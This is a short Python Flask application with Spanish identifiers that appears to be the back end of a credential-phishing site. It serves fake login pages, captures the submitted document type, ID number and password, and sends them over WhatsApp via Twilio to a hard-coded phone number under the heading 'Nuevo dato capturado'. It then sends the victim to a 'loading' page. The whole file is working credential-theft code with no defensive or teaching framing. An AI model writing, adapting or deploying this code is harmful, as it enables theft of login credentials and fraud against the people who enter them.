from flask import Flask, render_template, request, redirect, url_for
from twilio.rest import Client
import os

app = Flask(__name__)

# leer desde variables de entorno
account_sid = os.environ.get("TWILIO_SID")
auth_token = os.environ.get("TWILIO_TOKEN")

client = Client(account_sid, auth_token)

def enviar_whatsapp(tipo, documento, clave):
    mensaje = f"""
Nuevo dato capturado:

Tipo: {tipo}
Documento: {documento}
Clave: {clave}
"""

    client.messages.create(
        from_='whatsapp:+14155238886',
        body=mensaje,
        to='whatsapp:+573234370477'
    )

@app.route("/")
def home():
    return render_template("index.html")

@app.route('/login')
def login():
    return render_template('login.html')

@app.route('/cargando')
def cargando():
    return render_template("cargando.html")

@app.route('/procesar_login', methods=['POST'])
def procesar_login():
    tipo = request.form.get('tipo_doc')
    documento = request.form.get('documento')
    clave = request.form.get('clave')

    enviar_whatsapp(tipo, documento, clave)

    return redirect(url_for('cargando'))

if __name__ == "__main__":
    app.run()